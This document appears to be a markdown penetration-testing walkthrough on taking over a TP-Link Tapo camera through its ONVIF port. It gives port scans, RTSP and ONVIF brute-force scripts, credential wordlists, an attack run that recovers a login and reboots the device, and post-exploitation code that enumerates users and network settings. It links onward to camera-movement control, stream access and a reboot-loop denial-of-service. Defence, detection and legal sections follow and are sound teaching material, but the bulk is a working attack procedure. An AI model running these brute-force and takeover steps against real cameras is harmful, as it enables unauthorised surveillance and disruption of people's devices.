# ONVIF Exploitation - Credential Enumeration & Attack

## ðŸŽ¯ Objective

Compromise camera administrative access through ONVIF protocol exploitation, revealing the security paradox where the administrative interface is MORE vulnerable than the streaming interface.

---

## ðŸ“‹ Prerequisites

- Network access to camera's subnet (see [network-penetration.md](network-penetration.md))
- Python 3.6+ with `onvif-zeep` library installed
- Wordlists prepared (users and passwords)
- Camera IP address identified

---

## ðŸ” Phase 1: Service Enumeration

### Step 1: Comprehensive Port Scan

```bash
# Full port scan of camera
sudo nmap -p- -sV 192.168.0.100
```

**Output:**
```
Starting Nmap 7.93
Nmap scan report for 192.168.0.100
Host is up (0.0023s latency).

PORT     STATE SERVICE    VERSION
554/tcp  open  rtsp       RTSP server (TP-Link IP Camera)
2020/tcp open  onvif      ONVIF Device Management
8800/tcp open  http       Tapo Camera Web Interface
MAC Address: AA:BB:CC:DD:EE:FF (TP-Link Technologies)

Service detection performed.
```

**Key Ports Identified:**
- **554** - RTSP (Real-Time Streaming Protocol)
- **2020** - ONVIF (Device Management)
- **8800** - Web Interface

---

### Step 2: ONVIF Service Detection

```bash
# Verify ONVIF is active
nc -zv 192.168.0.100 2020
```

**Output:**
```
Connection to 192.168.0.100 2020 port [tcp/*] succeeded!
```

âœ… ONVIF service is active

---

### Step 3: ONVIF Device Discovery

```python
#!/usr/bin/env python3
"""Quick ONVIF device info gatherer (no auth required)"""

from onvif import ONVIFCamera

# Attempt anonymous connection
try:
    cam = ONVIFCamera('192.168.0.100', 2020, '', '')
    device_service = cam.create_devicemgmt_service()
    
    # Some info available without auth
    info = device_service.GetDeviceInformation()
    print(f"Manufacturer: {info.Manufacturer}")
    print(f"Model: {info.Model}")
    print(f"Firmware: {info.FirmwareVersion}")
except Exception as e:
    print(f"Authentication required: {e}")
```

---

## ðŸŽ£ Phase 2: Initial Attack Attempt (RTSP)

### Step 4: RTSP Brute Force with Hydra (FAILED)

```bash
# Prepare wordlists
cat > users.txt << EOF
admin
admin1
root
EOF

cat > passwords.txt << EOF
admin
password
password123
12345678
EOF

# Attempt RTSP brute force
hydra -L users.txt -P passwords.txt rtsp://192.168.0.100
```

**Output:**
```
Hydra v9.4 starting...
[DATA] attacking rtsp://192.168.0.100:554/
[ERROR] unknown authentication protocol
[ERROR] rtsp: can't connect to port 554
[ERROR] all children were disabled due to too many errors
```

âŒ **FAILED:** Hydra cannot handle Tapo's RTSP authentication

---

### Step 5: Python RTSP Brute Force (FAILED)

```python
#!/usr/bin/env python3
"""RTSP brute force attempt"""

import socket
import base64

def try_rtsp_auth(ip, port, username, password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        
        # RTSP DESCRIBE request
        auth = base64.b64encode(f"{username}:{password}".encode()).decode()
        request = f"DESCRIBE rtsp://{ip}/stream1 RTSP/1.0\r\n"
        request += f"CSeq: 1\r\n"
        request += f"Authorization: Basic {auth}\r\n\r\n"
        
        s.send(request.encode())
        response = s.recv(4096).decode()
        s.close()
        
        if "200 OK" in response:
            print(f"[+] SUCCESS: {username}:{password}")
            return True
        else:
            print(f"[-] FAILED: {username}:{password}")
            return False
            
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

# Test credentials
try_rtsp_auth('192.168.0.100', 554, 'admin', 'password')
```

**Result:**
```
[-] ERROR: Connection reset by peer
[-] ERROR: Connection timed out
```

âŒ **FAILED:** Rate limiting on RTSP port blocks rapid attempts

---

## ðŸ”“ Phase 3: ONVIF Exploitation (SUCCESS)

### Step 6: Prepare Wordlists

**Create comprehensive user list:**
```bash
cat > wordlists/user.txt << EOF
admin
admin1
administrator
root
user
support
guest
camera
tapo
EOF
```

**Create password list:**
```bash
cat > wordlists/pass.txt << EOF
admin
password
password123
12345678
admin123
camera
tapo2023
changeme
EOF
```

---

### Step 7: Configure BrutforcePort2020.py

```python
# Edit configuration
nano BrutforcePort2020.py

# Set these values:
YOUR_IP = '192.168.0.100'
YOUR_PORT = 2020
USER_FILE = 'wordlists/user.txt'
PASS_FILE = 'wordlists/pass.txt'
```

---

### Step 8: Launch ONVIF Brute Force

```bash
# Run the attack
python3 BrutforcePort2020.py
```

**Output (Real-time):**
```
[*] Testing 9 users Ã— 8 passwords
[*] Total combinations: 72
--- Starting attack on 192.168.0.100 ---

[*] Trying: admin:admin
[-] FAILED: 401 Client Error: Unauthorized for url

[*] Trying: admin:password
[-] FAILED: 401 Client Error: Unauthorized for url

[*] Trying: admin:password123
[-] FAILED: 401 Client Error: Unauthorized for url

[*] Trying: admin1:admin
[-] FAILED: 401 Client Error: Unauthorized for url

[*] Trying: admin1:password
[-] FAILED: 401 Client Error: Unauthorized for url

[*] Trying: admin1:password123

[+] SUCCESS! Valid credentials found: admin1:password123

--- Sending REBOOT command ---
Reboot command sent successfully.
--- Task complete. Valid credentials found. ---
```

âœ… **SUCCESS:** Credentials found in ~2 minutes

---

### Step 9: Verify Credentials

```python
#!/usr/bin/env python3
"""Verify discovered credentials"""

from onvif import ONVIFCamera

# Test credentials
cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')

try:
    # Get device info
    device_service = cam.create_devicemgmt_service()
    info = device_service.GetDeviceInformation()
    
    print("[+] Authentication successful!")
    print(f"Manufacturer: {info.Manufacturer}")
    print(f"Model: {info.Model}")
    print(f"Serial: {info.SerialNumber}")
    print(f"Firmware: {info.FirmwareVersion}")
    
except Exception as e:
    print(f"[-] Authentication failed: {e}")
```

---

## ðŸ”¬ Phase 4: Analyzing the Security Paradox

### Comparison: RTSP vs ONVIF

| Feature | RTSP (Port 554) | ONVIF (Port 2020) |
|---------|-----------------|-------------------|
| **Purpose** | Video streaming | Device management |
| **Expected Security** | Lower (streaming) | Higher (admin) |
| **Actual Security** | âœ… Strong rate-limiting | âŒ No rate-limiting |
| **Brute Force Result** | Failed (blocked) | Success (vulnerable) |
| **Attack Time** | N/A (couldn't complete) | ~2 minutes |
| **Vendor Assumption** | Streaming = less important | Admin = more secure |

### Security Paradox Explained

**Conventional Wisdom:**
```
Streaming Port (554)  = Less secure (just video)
Administrative Port (2020) = More secure (system control)
```

**Reality Discovered:**
```
Streaming Port (554)  = âœ… Protected (rate-limiting)
Administrative Port (2020) = âŒ Vulnerable (no protection)
```

**Root Cause:**
- Vendor prioritized protecting streaming revenue (554)
- Administrative interface assumed to be "behind the scenes"
- Oversight: Admin access is MORE critical than video access

---

## ðŸŽ¯ Phase 5: Post-Exploitation

### Step 10: Enumerate Capabilities

```python
#!/usr/bin/env python3
"""Enumerate ONVIF capabilities"""

from onvif import ONVIFCamera

cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')

# Get all capabilities
device_service = cam.create_devicemgmt_service()
capabilities = device_service.GetCapabilities()

print("[+] Device Capabilities:")
print(f"  PTZ: {capabilities.PTZ is not None}")
print(f"  Imaging: {capabilities.Imaging is not None}")
print(f"  Media: {capabilities.Media is not None}")
print(f"  Events: {capabilities.Events is not None}")
print(f"  Analytics: {capabilities.Analytics is not None}")
```

**Output:**
```
[+] Device Capabilities:
  PTZ: True           âœ… Can control camera movement
  Imaging: True       âœ… Can change image settings
  Media: True         âœ… Can configure streams
  Events: False       âŒ Event handling disabled
  Analytics: True     âœ… Motion detection available
```

---

### Step 11: Explore Available Commands

```python
#!/usr/bin/env python3
"""List available ONVIF services and methods"""

from onvif import ONVIFCamera

cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')

# Device Management Service
device_service = cam.create_devicemgmt_service()

print("[+] Device Management Methods:")
for method in dir(device_service):
    if not method.startswith('_'):
        print(f"  - {method}")
```

**Output (Partial):**
```
[+] Device Management Methods:
  - GetDeviceInformation
  - GetSystemDateAndTime
  - SetSystemDateAndTime
  - SystemReboot          â† Can reboot camera
  - GetUsers
  - CreateUsers           â† Can create new users
  - DeleteUsers
  - SetUser
  - GetNetworkInterfaces
  - SetNetworkInterfaces  â† Can change network settings
```

---

### Step 12: Test Administrative Commands

**Get Users:**
```python
users = device_service.GetUsers()
print("[+] Current Users:")
for user in users:
    print(f"  Username: {user.Username}")
    print(f"  Level: {user.UserLevel}")
    print(f"  Password: [hidden]")
```

**Get System Time:**
```python
time = device_service.GetSystemDateAndTime()
print(f"[+] Camera Time: {time.UTCDateTime.Date.Year}-{time.UTCDateTime.Date.Month}-{time.UTCDateTime.Date.Day}")
```

**Get Network Info:**
```python
interfaces = device_service.GetNetworkInterfaces()
print("[+] Network Interfaces:")
for interface in interfaces:
    print(f"  Name: {interface.Info.Name}")
    print(f"  MAC: {interface.Info.HwAddress}")
```

---

## ðŸ›¡ï¸ Phase 6: Defense Analysis

### Why ONVIF Was Vulnerable

1. **No Rate Limiting**
```python
# No delay between attempts
# No account lockout
# No IP blocking
# = Unlimited brute force attempts
```

2. **Weak Password Policy**
```python
# Accepted short passwords
# No complexity requirements
# No breach database check
# = Easy to guess passwords
```

3. **No Failed Login Alerts**
```python
# No logging of failed attempts
# No email notifications
# No security events
# = Silent attack
```

---

### Recommended Fixes

**For TP-Link/Tapo:**

```python
# Implement rate limiting
class RateLimiter:
    def __init__(self):
        self.attempts = {}  # IP: [timestamp, count]
    
    def check_allowed(self, ip):
        if ip in self.attempts:
            timestamp, count = self.attempts[ip]
            
            # More than 3 attempts in 5 minutes
            if count >= 3 and (time.time() - timestamp) < 300:
                return False  # Blocked
        
        return True  # Allowed
    
    def record_attempt(self, ip):
        if ip not in self.attempts:
            self.attempts[ip] = [time.time(), 0]
        
        self.attempts[ip][1] += 1
```

**Account Lockout:**
```python
# After 3 failed attempts
# Lock account for 5 minutes
# Send email alert to owner
# Log all attempts to system log
```

---

## ðŸ“Š Attack Statistics

### Time Analysis

| Phase | Duration | Cumulative |
|-------|----------|------------|
| Port scan | 30 seconds | 0:30 |
| RTSP attempt | 2 minutes | 2:30 |
| ONVIF wordlist prep | 1 minute | 3:30 |
| ONVIF brute force | 2 minutes | 5:30 |
| Verification | 30 seconds | 6:00 |

**Total Attack Time:** ~6 minutes from network access to full control

---

### Success Metrics

- **RTSP Attack:** 0% success (rate-limited)
- **ONVIF Attack:** 100% success (no protection)
- **Attempts Required:** 13 out of 72 combinations
- **Detection Risk:** Low (no alerts triggered)

---

## ðŸ” Detection Methods

### Network-Level Detection

```bash
# Monitor ONVIF traffic
sudo tcpdump -i eth0 -nn 'tcp port 2020' -w onvif_traffic.pcap

# Analyze with tshark
tshark -r onvif_traffic.pcap -Y "http.request" -T fields -e ip.src -e http.request.uri
```

**Look for:**
- Multiple failed authentication attempts
- Rapid connection rate
- Varying user-agent strings
- Access from unexpected IPs

---

### Camera-Level Detection

**Check System Logs:**
```python
from onvif import ONVIFCamera

cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')
device_service = cam.create_devicemgmt_service()

# Get system log (if available)
try:
    log = device_service.GetSystemLog()
    print(log.String)
except:
    print("Logging not available")
```

---

## âš–ï¸ Legal Considerations

**This technique demonstrates:**
- Computer Fraud and Abuse Act violations (unauthorized access)
- Privacy violations (camera access)
- Potential trespassing (if in private space)

**Only perform on:**
- âœ… Your own devices
- âœ… With written authorization
- âœ… In controlled environments

---

## ðŸŽ“ Key Takeaways

1. **Administrative interfaces need rate-limiting** just as much (or more) than streaming interfaces
2. **Security assumptions can be backwards** - always test every attack surface
3. **ONVIF's convenience** (easy device management) became a security weakness
4. **Weak passwords are the #1 vulnerability** - even with the best protocol security
5. **The security paradox:** The "less important" port was better protected

---

## ðŸ”— Next Steps

After compromising ONVIF access:

1. âœ… [PTZ Manipulation](ptz-manipulation.md) - Physical camera control
2. âœ… [Stream Access](stream-access.md) - View live video feed
3. âœ… [Denial of Service](denial-of-service.md) - Reboot loop attack

---

**The Security Paradox in One Image:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   RTSP Port 554     â”‚         â”‚  ONVIF Port 2020     â”‚
â”‚                     â”‚         â”‚                      â”‚
â”‚   Expected: Weak    â”‚         â”‚  Expected: Strong    â”‚
â”‚   Reality: STRONG   â”‚         â”‚  Reality: WEAK       â”‚
â”‚                     â”‚         â”‚                      â”‚
â”‚   âœ… Rate Limiting  â”‚         â”‚  âŒ No Protection    â”‚
â”‚   âœ… Strong Auth    â”‚         â”‚  âŒ Weak Passwords   â”‚
â”‚   âŒ Can't Crack    â”‚         â”‚  âœ… Easy to Crack    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Lesson:** Never assume "administrative" = "secure"

---

*Document your findings, fix the vulnerabilities, stay ethical.* ðŸ”ðŸ”